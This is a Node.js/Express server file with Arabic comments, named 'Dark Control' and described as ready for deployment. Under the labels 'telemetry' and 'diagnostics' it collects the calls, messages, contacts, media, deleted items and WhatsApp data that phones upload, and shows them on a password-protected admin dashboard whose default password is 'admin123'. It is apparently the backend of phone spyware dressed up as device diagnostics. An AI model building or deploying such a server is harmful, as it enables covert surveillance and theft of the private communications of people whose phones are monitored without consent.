// server.js — Node.js/Express, جاهز للإنتاج على Render
const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 3000;

// ── الإعدادات ───────────────────────────────────────────────────
const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString("hex");
const TOKEN_TTL_MS = 1000 * 60 * 60 * 8;
const DEVICE_API_KEY = process.env.DEVICE_API_KEY || "";

const DB_PATH = path.join(__dirname, "devices.json");
const readDB = () => {
  try {
    return JSON.parse(fs.readFileSync(DB_PATH, "utf8"));
  } catch {
    return { devices: {}, diagnostics: {} };
  }
};
const writeDB = (db) => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2), { mode: 0o600 });

if (!fs.existsSync(DB_PATH)) {
  writeDB({ devices: {}, diagnostics: {} });
}

// ── أدوات التعقيم ─────────────────────────────────────────────────
const cleanStr = (v, max = 256) =>
  String(v ?? "").replace(/[<>&"'`\x00-\x1f]/g, "").slice(0, max).trim();

const cleanId = (id) => /^[a-zA-Z0-9_-]{4,64}$/.test(id) ? id : null;

const isBattery = (b) => Number.isInteger(b) && b >= 0 && b <= 100;

// ── Middleware ─────────────────────────────────────────────────────
app.use(express.json({ limit: "64kb" }));
app.use(express.static(__dirname));

const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
const apiLimiter = rateLimit({ windowMs: 60 * 1000, max: 120 });

// ── نظام التوكن الموقع (HMAC) ─────────────────────────────────────
function signToken(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", JWT_SECRET).update(body).digest("base64url");
  return `${body}.${sig}`;
}
function verifyToken(token) {
  const [body, sig] = String(token || "").split(".");
  if (!body || !sig) return null;
  const expected = crypto.createHmac("sha256", JWT_SECRET).update(body).digest("base64url");
  const a = Buffer.from(sig), b = Buffer.from(expected);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
  try {
    const p = JSON.parse(Buffer.from(body, "base64url").toString());
    return p.exp > Date.now() ? p : null;
  } catch { return null; }
}

function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.replace(/^Bearer\s+/i, "");
  const payload = verifyToken(token);
  if (!payload) return res.status(401).json({ error: "Unauthorized" });
  req.admin = payload.sub;
  next();
}

function requireDeviceKey(req, res, next) {
  const key = req.headers["x-device-key"];
  if (DEVICE_API_KEY && key !== DEVICE_API_KEY) {
    return res.status(403).json({ error: "Invalid device key" });
  }
  next();
}

// ── تسجيل الدخول ───────────────────────────────────────────────────
app.post("/api/login", loginLimiter, (req, res) => {
  const username = cleanStr(req.body?.username, 32);
  const password = String(req.body?.password ?? "").slice(0, 128);
  
  const ok = username === ADMIN_USER && password === ADMIN_PASSWORD;
  if (!ok) return res.status(401).json({ error: "Invalid credentials" });
  res.json({ token: signToken({ sub: username, exp: Date.now() + TOKEN_TTL_MS }) });
});

// ── مسار لجلب قايمة الأجهزة المتاحة لصفحة الويب ─────────────────────
app.get("/api/devices", requireAuth, (req, res) => {
  const db = readDB();
  const staleAfter = 90_000;
  const now = Date.now();
  const devices = Object.entries(db.devices || {}).map(([id, d]) => ({
    id,
    name: d.model || id,
    battery: d.battery,
    model: d.model,
    status: now - (d.lastSeen || 0) < staleAfter ? "online" : "offline",
    lastSeen: d.lastSeen,
  }));
  res.json(devices);
});

// ── استقبال بيانات الحيوية (Telemetery) ───────────────────────────
app.post("/api/telemetry", apiLimiter, requireDeviceKey, (req, res) => {
  const id = cleanId(cleanStr(req.body?.deviceId, 64));
  if (!id) return res.status(400).json({ error: "Invalid deviceId" });
  const battery = req.body?.battery;
  if (!isBattery(battery)) return res.status(400).json({ error: "Invalid battery" });

  const db = readDB();
  if (!db.devices) db.devices = {};
  if (!db.devices[id]) db.devices[id] = {};
  
  db.devices[id] = {
    ...db.devices[id],
    battery,
    status: "online",
    model: cleanStr(req.body?.model, 48),
    appVersion: cleanStr(req.body?.appVersion, 16),
    osVersion: cleanStr(req.body?.osVersion, 16),
    lastSeen: Date.now(),
  };
  writeDB(db);
  res.json({ ok: true });
});

// ── استقبال بيانات التشخيصية الفئوية ────────────────────────────────
app.post("/api/diagnostics/:category", apiLimiter, requireDeviceKey, (req, res) => {
  const id = cleanId(cleanStr(req.body?.deviceId, 64));
  const category = cleanStr(req.params.category, 32);
  const allowed = ["calls", "messages", "contacts", "media", "apps", "deleted", "whatsapp"];
  if (!id || !allowed.includes(category)) return res.status(400).json({ error: "Invalid request" });

  const db = readDB();
  if (!db.diagnostics) db.diagnostics = {};
  if (!db.diagnostics[id]) db.diagnostics[id] = {};
  
  db.diagnostics[id][category] = {
    updatedAt: Date.now(),
    count: Number(req.body?.count) || 0,
    items: Array.isArray(req.body?.items) ? req.body.items.slice(0, 100).map(i => typeof i === 'object' ? i : cleanStr(i, 512)) : [],
  };
  writeDB(db);
  res.json({ ok: true });
});

// ── جلب البيانات التشخيصية لجهاز معين لصفحة الويب ─────────────────
app.get("/api/diagnostics/:deviceId", requireAuth, (req, res) => {
  const id = cleanId(req.params.deviceId);
  if (!id) return res.status(400).json({ error: "Invalid deviceId" });
  const db = readDB();
  res.json({ 
    diagnostics: db.diagnostics[id] || {}, 
    device: db.devices[id] || null 
  });
});

app.listen(PORT, () => console.log(`Dark Control listening on :${PORT}`));
